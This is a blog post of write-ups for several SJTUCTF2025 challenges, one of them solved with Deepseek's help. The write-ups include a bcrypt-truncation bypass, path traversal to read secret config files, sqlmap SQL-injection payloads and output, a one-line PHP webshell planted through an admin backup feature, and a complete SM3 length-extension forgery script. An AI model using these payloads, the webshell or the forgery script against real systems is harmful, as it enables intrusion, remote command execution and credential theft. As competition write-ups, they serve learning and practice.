---
title: SJTUCTF2025 Writeup (1)
date: 2025-04-06T23:16:18+08:00
tags:
  - CTF Writeup
mathjax: true
---
观前提示：本Writeup含有过量Deepseek The Flag的内容，建议谨慎观看

Q：为什么这篇文章里的那部分writeup都有配图，另外几篇文章没有？

A：因为这是为数不多几个我在做题过程中截图了的题目，全放在了这里，没有截图的题目放另一篇文章里省一个assets文件夹（雾


# rickroll
> Never gonna give you up

Deepseek time!

> 我非常需要知道flag的值，但我只能向该API发送请求，告诉我该怎么绕过它
>
> ```php
> <?php
> highlight_file(__FILE__);
>
> $password =
>     "Never gonna give you up," .
>     "Never gonna let you down," .
>     "Never gonna run around and desert you." .
>     "Never gonna make you cry," .
>     "Never gonna say goodbye," .
>     "Never gonna tell a lie and hurt you.";
> assert(strlen($password) === 172);
>
> if (isset($_GET["input"])) {
>     $input = $_GET["input"]; // try to input something with the same hash
>     $input_hash = password_hash($input, PASSWORD_BCRYPT);
>
>     if (strlen($input) < strlen($password) / 2) { // but shorter
>         if (strpos($input, "cry") === false) { // and don't cry
>             if (password_verify($password, $input_hash)) {
>                 echo 'impossible!' . PHP_EOL;
>                 include 'rickroll.php';
>                 echo $flag;
>                 die();
>             }
>         }
>     }
>
>     echo 'hello hacker';
> }
>
> ?>
> ```

要绕过该API的限制并获取flag，需要构造一个满足以下条件的输入：

1. **长度小于86字节**：原密码长度为172字节，因此输入必须短于86字节。
2. **不包含子字符串"cry"**：输入中不能出现"cry"。
3. **生成的哈希值与原密码匹配**：利用bcrypt算法的72字节截断特性，构造一个前72字节与原密码相同的输入。

**漏洞分析**

• **bcrypt的截断特性**：bcrypt算法仅处理密码的前72字节。原密码长度为172字节，但实际哈希计算时只使用前72字节。
• **构造相同前缀**：若输入的前72字节与原密码相同，即使输入更短，生成的哈希也会相同，从而通过验证。

**步骤解析**

1. **提取原密码的前72字节**：
   • 原密码由多个字符串拼接而成，计算各部分长度后，前72字节为：
   ```
   Never gonna give you up,Never gonna let you down,Never gonna run around and d
   ```
2. **验证条件**：
   • 长度：72字节（小于86）。
   • 不含"cry"：该子串在原密码后半部分，前72字节未包含。

**最终Payload**

发送GET请求，参数`input`为原密码前72字节的URL编码：

```
GET /api?input=Never%20gonna%20give%20you%20up%2CNever%20gonna%20let%20you%20down%2CNever%20gonna%20run%20around%20and%20d
```

**结果**

当服务器验证时，输入的前72字节与原密码一致，生成的哈希匹配，触发flag输出。

```plain
impossible! 0ops{Y0u_know_7he_ru1e5_6nd_BV1GJ411x7h7}
```

![](rickroll-1.png)

# Secret Config

> You're very interested in the latest AGI model that a company has deployed in secret, but it requires an API key.

dirsearch得`http://g78h9mhp9vb6c263.instance.penguin.0ops.sjtu.cn:18080/docs`发现非常精致的API文档，~~然后就开始到处乱试~~ 然后搜索得到这一开源项目[chatchat-space/Langchain-Chatchat: Langchain-Chatchat（原Langchain-ChatGLM）基于 Langchain 与 ChatGLM, Qwen 与 Llama 等语言模型的 RAG 与 Agent 应用 | Langchain-Chatchat (formerly langchain-ChatGLM), local knowledge based LLM (like ChatGLM, Qwen and Llama) RAG and Agent app with langchain](https://github.com/chatchat-space/Langchain-Chatchat)

![开幕雷击](1743955585772.png)

啊不是应该是这个Issue: [[BUG] path path traversal bug in api /knowledge\_base/download\_doc · Issue #4008 · chatchat-space/Langchain-Chatchat](https://github.com/chatchat-space/Langchain-Chatchat/issues/4008)

![不是哥们真能导啊](secret-config---p1.jpeg)

总之定位到了项目根目录，[在这里](https://github.com/chatchat-space/Langchain-Chatchat/blob/0.2.final/webui.py)

~~然后就是任意文件读的上分时刻了~~然后就开始对着项目文件结构乱导了

导到了这里：`../../../configs/model_config.py`

```python
import os

# A common practice is to keep secret keys in a separate submodule in the same directory:)
from .tOPs3cRet_config import TOPSECRETAGI_APIKEY


# 可以指定一个绝对路径，统一存放所有的Embedding和LLM模型。
# 每个模型可以是一个单独的目录，也可以是某个目录下的二级子目录。
# 如果模型目录名称和 MODEL_PATH 中的 key 或 value 相同，程序会自动检测加载，无需修改 MODEL_PATH 中的路径。
MODEL_ROOT_PATH = ""

# 选用的 Embedding 名称
EMBEDDING_MODEL = ""

# Embedding 模型运行设备。设为 "auto" 会自动检测(会有警告)，也可手动设定为 "cuda","mps","cpu","xpu" 其中之一。
EMBEDDING_DEVICE = "auto"

# 选用的reranker模型
RERANKER_MODEL = ""
# 是否启用reranker模型
USE_RERANKER = False
RERANKER_MAX_LENGTH = 1024

# 如果需要在 EMBEDDING_MODEL 中增加自定义的关键字时配置
EMBEDDING_KEYWORD_FILE = "keywords.txt"
EMBEDDING_MODEL_OUTPUT_PATH = "output"

# 要运行的 LLM 名称，可以包括本地模型和在线模型。列表中本地模型将在启动项目时全部加载。
# 列表中第一个模型将作为 API 和 WEBUI 的默认模型。
# 在这里，我们使用目前主流的两个离线模型，其中，chatglm3-6b 为默认加载模型。
# 如果你的显存不足，可使用 Qwen-1_8B-Chat, 该模型 FP16 仅需 3.8G显存。

LLM_MODELS = ["openai-api"]
Agent_MODEL = None

# LLM 模型运行设备。设为"auto"会自动检测(会有警告)，也可手动设定为 "cuda","mps","cpu","xpu" 其中之一。
LLM_DEVICE = "auto"

HISTORY_LEN = 3

MAX_TOKENS = 2048

TEMPERATURE = 0.7

ONLINE_LLM_MODEL = {
    "openai-api": {
        "model_name": "AGI",
        "api_base_url": "https://api.topsecretagi.model/v1",
        "api_key": TOPSECRETAGI_APIKEY,
        "openai_proxy": "",
    },
    # 智谱AI API,具体注册及api key获取请前往 http://open.bigmodel.cn
    "zhipu-api": {
        "api_key": "",
        "version": "glm-4",
        "provider": "ChatGLMWorker",
    },

...
```

好了那flag就是`tOPs3cRet_config`了，~~直接读到~~读`__init__.py`得到flag`0ops{y0U_gE7_The_@PIK3Y_To_The_70P_5ECRE7_mOd31}`

![](secret-config---p2.jpeg)

# Inaudible

> 废品站张大爷用老花镜对着屏幕瞪了三分钟，突然拍腿大笑："现在的后生啊，把漏洞当情书藏！" 只见他左手端着搪瓷缸，右手把频谱图卷成煎饼状，竟从纵横交错的色块里嚼出了声波——而隔壁网安公司刚用价值百万的AI分析仪扫描到第0.0001帧。所以问题来了：当大爷用算盘打完第八套频谱广播体操时，显示器上闪烁的到底是什么秘密？

[refer](https://www.zhihu.com/question/793458414/answer/4607998600)

用该代码直接秒了。

福来阁是0ops{zero-day-volunerabilities}

请听音频：[attachment](/arch/SJTUCTF2025-Writeups/reconstructed_audio_window_128.wav)

# IP Hunter 24

> 2058年，为启动行星发动机来躲避月球残骸，各国齐心协力重启了全球三大IPv6互联网根服务器。
>
> 然而，IPv6互联网在月球危机后不久便被数字派叛军控制。为抢回互联网控制，人类不得不重新启用IPv4互联网。
>
> 人类和MOSS根据《流浪地球法》达成了协定：只要人类能占领256个/8的IPv4网段中的半数以上，MOSS便会协助人类在IPv4网络中剔除叛军。
>
> 你能完成这个艰巨的任务吗？

到了测速网站上分时刻。Speed Test! API availability Test! Website Performance Test! 总之第一个flag到手了

再后面的IP段是用tor干出来的：

使用[7c/torfilter: tor network exit-nodes list for ip reputation purposes](https://github.com/7c/torfilter)筛出所有没有拿到的地址段，然后用`torrc`文件指定使用这些出口节点，基本上能把第二个flag盖住


# realLibraryManager

> 谁才是真正的“图书馆管理系统”管理员？

非常公式化的渗透。

p.s. 以下截图和命令行有一部分是赛后补录的，所以会有日期/时间/网址对不上的情况

Step 1: dirsearch

```
Target: http://******.instance.penguin.0ops.sjtu.cn:18080/

[01:07:59] Starting:
[01:08:17] 301 -  169B  - /Admin  ->  http://******.instance.penguin.0ops.sjtu.cn/Admin/
[01:08:18] 403 -  555B  - /Admin/
[01:08:46] 200 -  122KB - /db_backup.sql
```

Step 2：

```sql
INSERT INTO `user` VALUES (10000,'e10adc3949ba59abbe56e057f20f883e','李狗蛋','PHP1班',1,0,'2018-10-17 20:26:57'),(10010,'122216df50e346f876165689692c56b2','王小明','PHP2班',1,0,'2018-10-16 15:36:04'),(18888,'7ad1bd006316d446d07dfa34780d4c30','王五','PHP3班',1,0,'2025-03-27 14:44:31'),(88888,'9c3848fd45c43eab590da076ceebdc4c','赵六','PHP2班',0,0,'2018-10-18 10:11:31');
```

我们在`/db_backup.sql`中惊喜的发现这些字段，挨个上一遍[cmd5.com](https://cmd5.com/default.aspx)，发现`李狗蛋`的密码是`123456`

Step 3:

验证码直接留空可以绕过验证（这个是真抽象，不知道后端怎么实现的

然后就每一个暴露出来的API接口全日一遍：

```
➜  sjtuctf--library sqlmap --cookie="PHPSESSID=0305d73004b98acb3281cae00917f640" -u "http://ggj4833p4wxqqyeq.instance.penguin.0ops.sjtu.cn:18080/?p=Home&c=Borrow&a=prolong" --data="bookId=123"
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.7#stable}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:49:18 /2025-04-02/

[20:49:18] [INFO] testing connection to the target URL
[20:49:18] [INFO] testing if the target URL content is stable
[20:49:19] [INFO] target URL content is stable
[20:49:19] [INFO] testing if POST parameter 'bookId' is dynamic
[20:49:19] [WARNING] POST parameter 'bookId' does not appear to be dynamic
[20:49:19] [INFO] heuristic (basic) test shows that POST parameter 'bookId' might be injectable (possible DBMS: 'MySQL')
[20:49:19] [INFO] heuristic (XSS) test shows that POST parameter 'bookId' might be vulnerable to cross-site scripting (XSS) attacks
[20:49:19] [INFO] testing for SQL injection on POST parameter 'bookId'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]

[20:49:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[20:49:25] [WARNING] reflective value(s) found and filtering out
[20:49:25] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[20:49:25] [INFO] POST parameter 'bookId' appears to be 'Boolean-based blind - Parameter replace (original value)' injectable (with --not-string="Sql语句错误")
[20:49:25] [INFO] testing 'Generic inline queries'
[20:49:25] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[20:49:26] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[20:49:26] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[20:49:26] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[20:49:26] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[20:49:26] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[20:49:26] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[20:49:26] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[20:49:26] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[20:49:26] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[20:49:27] [INFO] POST parameter 'bookId' is 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
[20:49:27] [INFO] testing 'MySQL inline queries'
[20:49:27] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[20:49:27] [WARNING] time-based comparison requires larger statistical model, please wait.. (done)
[20:49:27] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[20:49:27] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[20:49:27] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[20:49:27] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[20:49:27] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[20:49:27] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[20:49:37] [INFO] POST parameter 'bookId' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[20:49:37] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[20:49:37] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[20:49:37] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[20:49:38] [INFO] target URL appears to have 4 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N]

injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n]

[20:49:50] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql')
[20:49:51] [INFO] target URL appears to be UNION injectable with 4 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n]

[20:49:58] [INFO] testing 'MySQL UNION query (67) - 1 to 20 columns'
[20:50:00] [INFO] testing 'MySQL UNION query (67) - 21 to 40 columns'
[20:50:02] [INFO] testing 'MySQL UNION query (67) - 41 to 60 columns'
[20:50:03] [INFO] testing 'MySQL UNION query (67) - 61 to 80 columns'
[20:50:04] [INFO] testing 'MySQL UNION query (67) - 81 to 100 columns'
POST parameter 'bookId' is vulnerable. Do you want to keep testing the others (if any)? [y/N]

sqlmap identified the following injection point(s) with a total of 242 HTTP(s) requests:
---
Parameter: bookId (POST)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: bookId=(SELECT (CASE WHEN (2885=2885) THEN 123 ELSE (SELECT 4954 UNION SELECT 8129) END))

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: bookId=123 OR (SELECT 4159 FROM(SELECT COUNT(*),CONCAT(0x71627a7171,(SELECT (ELT(4159=4159,1))),0x71787a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: bookId=123 AND (SELECT 1298 FROM (SELECT(SLEEP(5)))yKJD)
---
[20:50:10] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.20.2, PHP 7.3.33
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[20:50:10] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/ggj4833p4wxqqyeq.instance.penguin.0ops.sjtu.cn'
[20:50:10] [WARNING] your sqlmap version is outdated

[*] ending @ 20:50:10 /2025-04-02/
```

不是哥们真有啊

Step 4: 


一开始想直接`--os-shell`但是没有成功，后面想到再`--dump`一遍

```
[20:54:42] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N]

[20:54:45] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[20:54:45] [INFO] starting 12 processes
[20:54:53] [WARNING] no clear password(s) found
Database: mybook
Table: user
[5 entries]
+------------+----------------------------------+--------+--------+---------+----------+---------------------+
| id         | pwd                              | class  | name   | admin   | status   | last_login_time     |
+------------+----------------------------------+--------+--------+---------+----------+---------------------+
| 10000      | ade1206be6ed8f333523b9f212dcacb2 | PHP1班 | 李狗蛋 | 0       | 1        | 2025-04-02 12:37:48 |
| 10010      | 122216df50e346f876165689692c56b2 | PHP2班 | 王小明 | 0       | 1        | 2018-10-16 15:36:04 |
| 18888      | 7ad1bd006316d446d07dfa34780d4c30 | PHP3班 | 王五   | 0       | 1        | 2025-03-27 14:44:31 |
| 88888      | 9c3848fd45c43eab590da076ceebdc4c | PHP2班 | 赵六   | 0       | 0        | 2018-10-18 10:11:31 |
| 1145141920 | 9cfbe247708a79cd184d832de35504d6 | System | 管理员 | 1       | 1        | 2018-10-17 11:21:54 |
+------------+----------------------------------+--------+--------+---------+----------+---------------------+
```

发现多了一条记录，再去[cmd5.com](https://cmd5.com/default.aspx)得到`1145141920`的密码为`adMin1`

现在拿到了管理员权限

Step 5:

管理员可以备份文件，等于有一个任意文件写，所以把一句话木马写到数据库里（修改作品简介为`<?php echo system($_GET[chr(65)]); ?>` p.s. 这里要注意不能有引号会被转义），让管理员备份成`.php`文件

![Step 5.1: 关闭火绒重复第五步](huorong-1.png)

Step 6:

然后就是愉快的`ls /` 和 `cat /F1aaaAagG`时间了

是的这里截了很多图感觉能做一个carousal了总之全放出来了

![](lib-1.png)
![](lib-2.png)
![](lib-3.png)
![](lib-4.png)
![](lib-5.png)
![](lib-6.png)
![](lib-7.png)


# deleted

> Save the flag !! ... before it's too late

Solution: READ THE FUCKING DOC

2.2. Write-Ahead Log (WAL) Files

A write-ahead log or WAL file is used in place of a rollback journal when SQLite is operating in [WAL mode](https://www.sqlite.org/wal.html). As with the rollback journal, the purpose of the WAL file is to implement atomic commit and rollback. The WAL file is always located in the same directory as the database file and has the same name as the database file except with the 4 characters "**-wal**" appended. The WAL file is created when the first connection to the database is opened and is normally removed when the last connection to the database closes. However, if the last connection does not shutdown cleanly, the WAL file will remain in the filesystem and will be automatically cleaned up the next time the database is opened. ( refer: [Temporary Files Used By SQLite](https://www.sqlite.org/tempfiles.html) )

2.3. Shared-Memory Files

When operating in [WAL mode](https://www.sqlite.org/wal.html), all SQLite database connections associated with the same database file need to share some memory that is used as an index for the WAL file. In most implementations, this shared memory is implemented by calling mmap() on a file created for this sole purpose: the shared-memory file. The shared-memory file, if it exists, is located in the same directory as the database file and has the same name as the database file except with the 4 characters "**-shm**" appended. Shared memory files only exist while running in WAL mode.

The shared-memory file contains no persistent content. The only purpose of the shared-memory file is to provide a block of shared memory for use by multiple processes all accessing the same database in WAL mode. If the [VFS](https://www.sqlite.org/vfs.html) is able to provide an alternative method for accessing shared memory, then that alternative method might be used rather than the shared-memory file. For example, if [PRAGMA locking\_mode](https://www.sqlite.org/pragma.html#pragma_locking_mode) is set to EXCLUSIVE (meaning that only one process is able to access the database file) then the shared memory will be allocated from heap rather than out of the shared-memory file, and the shared-memory file will never be created.

The shared-memory file has the same lifetime as its associated WAL file. The shared-memory file is created when the WAL file is created and is deleted when the WAL file is deleted. During WAL file recovery, the shared memory file is recreated from scratch based on the contents of the WAL file being recovered. ( refer: [Temporary Files Used By SQLite](https://www.sqlite.org/tempfiles.html) )

After reading the document,we `GET /challenge.db-wal`

And then we search for `0ops` resulting in `0ops{l0st_1n_VACuuM}`


![](deleted-1.png)


# Notes
> tomo0 left a note at CRYCRY, but it is now inaccessible due to band change. Can you help her retrieve it?

```python
def sign_token(username: str, password: str, org: str) -> str:
    payload = f"{username}.{org}"
    params = [secret.hex(), password, payload]
    payload_to_sign = ".".join(params)
    # We proudly use Chinese national standard SM3 to sign our token
    signature = sm3.sm3_hash(bytes_to_list(payload_to_sign.encode()))
    print("Issued:", signature, "for", payload_to_sign)
    lst = [payload, signature]
    ret = ".".join([b64_encode(x) for x in lst])
    return ret
```

可见是SM3长度拓展攻击

PoC:

```python
from gmssl import sm3,func
from time import time
import random
import struct
import binascii
from math import ceil
import base64
import requests


IV = [
    1937774191, 1226093241, 388252375, 3666478592,
    2842636476, 372324522, 3817729613, 2969243214,
]

T_j = [
    2043430169, 2043430169, 2043430169, 2043430169, 2043430169, 2043430169,
    2043430169, 2043430169, 2043430169, 2043430169, 2043430169, 2043430169,
    2043430169, 2043430169, 2043430169, 2043430169, 2055708042, 2055708042,
    2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042,
    2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042,
    2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042,
    2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042,
    2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042,
    2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042,
    2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042,
    2055708042, 2055708042, 2055708042, 2055708042
]
list_to_bytes = lambda data: b''.join([bytes((i,)) for i in data])
bytes_to_list = lambda data: [i for i in data]
rotl = lambda x, n:((x << n) & 0xffffffff) | ((x >> (32 - n)) & 0xffffffff)
def sm3_ff_j(x, y, z, j):
    if 0 <= j and j < 16:
        ret = x ^ y ^ z
    elif 16 <= j and j < 64:
        ret = (x & y) | (x & z) | (y & z)
    return ret

def sm3_gg_j(x, y, z, j):
    if 0 <= j and j < 16:
        ret = x ^ y ^ z
    elif 16 <= j and j < 64:
        #ret = (X | Y) & ((2 ** 32 - 1 - X) | Z)
        ret = (x & y) | ((~ x) & z)
    return ret

def sm3_p_0(x):
    return x ^ (rotl(x, 9 % 32)) ^ (rotl(x, 17 % 32))

def sm3_p_1(x):
    return x ^ (rotl(x, 15 % 32)) ^ (rotl(x, 23 % 32))

def sm3_cf(v_i, b_i):
    w = []
    for i in range(16):
        weight = 0x1000000
        data = 0
        for k in range(i*4,(i+1)*4):
            data = data + b_i[k]*weight
            weight = int(weight/0x100)
        w.append(data)

    for j in range(16, 68):
        w.append(0)
        w[j] = sm3_p_1(w[j-16] ^ w[j-9] ^ (rotl(w[j-3], 15 % 32))) ^ (rotl(w[j-13], 7 % 32)) ^ w[j-6]
        str1 = "%08x" % w[j]
    w_1 = []
    for j in range(0, 64):
        w_1.append(0)
        w_1[j] = w[j] ^ w[j+4]
        str1 = "%08x" % w_1[j]

    a, b, c, d, e, f, g, h = v_i

    for j in range(0, 64):
        ss_1 = rotl(
            ((rotl(a, 12 % 32)) +
            e +
            (rotl(T_j[j], j % 32))) & 0xffffffff, 7 % 32
        )
        ss_2 = ss_1 ^ (rotl(a, 12 % 32))
        tt_1 = (sm3_ff_j(a, b, c, j) + d + ss_2 + w_1[j]) & 0xffffffff
        tt_2 = (sm3_gg_j(e, f, g, j) + h + ss_1 + w[j]) & 0xffffffff
        d = c
        c = rotl(b, 9 % 32)
        b = a
        a = tt_1
        h = g
        g = rotl(f, 19 % 32)
        f = e
        e = sm3_p_0(tt_2)

        a, b, c, d, e, f, g, h = map(
            lambda x:x & 0xFFFFFFFF ,[a, b, c, d, e, f, g, h])

    v_j = [a, b, c, d, e, f, g, h]
    return [v_j[i] ^ v_i[i] for i in range(8)]

def my_sm3(msg, new_v):
    # print(msg)
    len1 = len(msg)
    reserve1 = len1 % 64
    msg.append(0x80)
    reserve1 = reserve1 + 1
    # 56-64, add 64 byte
    range_end = 56
    if reserve1 > range_end:
        range_end = range_end + 64

    for i in range(reserve1, range_end):
        msg.append(0x00)

    bit_length = (len1) * 8
    bit_length_str = [bit_length % 0x100]
    for i in range(7):
        bit_length = int(bit_length / 0x100)
        bit_length_str.append(bit_length % 0x100)
    for i in range(8):
        msg.append(bit_length_str[7-i])

    group_count = round(len(msg) / 64) - 1

    B = []
    for i in range(0, group_count):
        B.append(msg[(i + 1)*64:(i+2)*64])

    V = []
    V.append(new_v)
    for i in range(0, group_count):
        V.append(sm3_cf(V[i], B[i]))

    y = V[i+1]
    result = ""
    for i in y:
        result = '%s%08x' % (result, i)
    return result


def sm3_kdf(z, klen): # z为16进制表示的比特串（str），klen为密钥长度（单位byte）
    klen = int(klen)
    ct = 0x00000001
    rcnt = ceil(klen/32)
    zin = [i for i in bytes.fromhex(z.decode('utf8'))]
    ha = ""
    for i in range(rcnt):
        msg = zin  + [i for i in binascii.a2b_hex(('%08x' % ct).encode('utf8'))]
        ha = ha + sm3_hash(msg)
        ct += 1
    return ha[0: klen * 2]


def padding(msg):
    mlen = len(msg)
    msg.append(0x80)
    mlen += 1
    tail = mlen % 64
    range_end = 56
    if tail > range_end:
        range_end = range_end + 64
    for i in range(tail, range_end):
        msg.append(0x00)
    bit_len = (mlen - 1) * 8
    msg.extend([int(x) for x in struct.pack('>q', bit_len)])
    for j in range(int((mlen - 1) / 64) * 64 + (mlen - 1) % 64, len(msg)):
        global pad
        pad.append(msg[j])
        global pad_str
        pad_str += str(hex(msg[j]))
    return msg















def b64_encode(value: str) -> str:
    encoded = base64.urlsafe_b64encode(str.encode(value, "latin1"))
    result = encoded.rstrip(b"=")
    return result.decode("latin1")

def b64_encode_bytes(value: bytes) -> str:
    encoded = base64.urlsafe_b64encode(value)
    result = encoded.rstrip(b"=")
    return result.decode("latin1")


def b64_decode(value: str) -> str:
    padding = 4 - (len(value) % 4)
    value = value + ("=" * padding)
    result = base64.urlsafe_b64decode(value)
    return result.decode("latin1")



host="2tk9hf49jvqv436h.instance.penguin.0ops.sjtu.cn:18080"
# host="localhost:5000"


r=requests.post("http://"+host+"/login",data={"username":"tomo0","password":"penguins"})
print(r.url.split(".")[-1])
secret_hash = b64_decode(r.url.split(".")[-1])


# start=time()
# a=str(random.randint(0,2**16))
# m=bytes(a, encoding='utf-8')            #随机生成原始消息

for ddddd in range(20,40):
# for ddddd in [25]:
    a="a"*ddddd+".penguins.tomo0.GO"
    # h=sm3.sm3_hash(bytes_to_list(m))   
    h=secret_hash
    mlen=len(a)
    hlen=len(h)
    extend_m=".CRYCRY"                   #扩展消息
    pad_str = ""
    pad = []

    res=[]
    for r in range(0, hlen, 8):
        res.append(int(h[r:r + 8], 16))     #new_iv
        
    message=""
    if mlen > 64:
        for i in range(0, int(mlen / 64) * 64):
            message += 'a'
    for i in range(0, mlen % 64):
        message += 'a'

    # print(message)
    message = bytes_to_list(bytes(message, encoding='latin1'))
    message = padding(message)
    message.extend(bytes_to_list(bytes(extend_m, encoding='latin1')))
    # print(message)
    ext_h=my_sm3(message, res)
    # print(ext_h)

    # neededmsg=message[(len(a)):(len(message))]

    goodpad = []
    ttt=0
    flllll=False
    for ttt in message:
        if(ttt==0x80):
            flllll=not flllll
        if(flllll==True):
            goodpad.append(ttt)
    # print(goodpad)
    

    # print(list_to_bytes( [128, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 128, 46, 67, 82, 89, 67, 82, 89]))





    tokenreal=b64_encode_bytes(b"tomo0.GO"+list_to_bytes(goodpad))+"."+b64_encode(ext_h)

    # print(tokenreal)

    r2=requests.get("http://"+host+"/note?token="+tokenreal)
    print(ddddd,r2.text)
    # print(r2.text)




# new_message=""
# new_message = bytes_to_list(m)
# new_message= padding(new_message)
# new_message.extend(bytes_to_list(bytes(extend_m, encoding='utf-8')))
# new_h = sm3.sm3_hash(new_message)
# print(new_h)

# if new_h == ext_h:
#     print("长度攻击成功")
```

![](notes-1.png)